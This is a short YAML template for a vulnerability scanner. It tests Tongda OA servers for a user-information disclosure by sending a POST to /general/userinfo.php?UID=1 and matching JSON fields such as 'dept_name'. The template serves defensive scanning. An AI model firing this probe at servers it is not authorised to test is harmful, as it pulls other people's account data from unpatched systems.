id: tongda-session-disclosure

info:
  name: Tongda User Session Disclosure
  author: ritikchaddha
  severity: medium
  description: Tongda User session exposed.
  reference:
    - https://mp.weixin.qq.com/s/llyGEBRo0t-C7xOLMDYfFQ
  classification:
    cpe: cpe:2.3:a:tongda:tongda:*:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: tongda
    product: tongda
  tags: tongda,disclosure,vuln

http:
  - method: POST
    path:
      - "{{BaseURL}}/general/userinfo.php?UID=1"

    matchers-condition: and
    matchers:
      - type: word
        name: tongda
        cpe: cpe:2.3:a:tongda:tongda:*:*:*:*:*:*:*:*
        part: body
        words:
          - '"dept_name":"'
          - '"online_flag":'
        condition: and

      - type: word
        name: tongda-2
        cpe: cpe:2.3:a:tongda:tongda:*:*:*:*:*:*:*:*
        part: header
        words:
          - "application/json"
        condition: and

      - type: status
        status:
          - 200
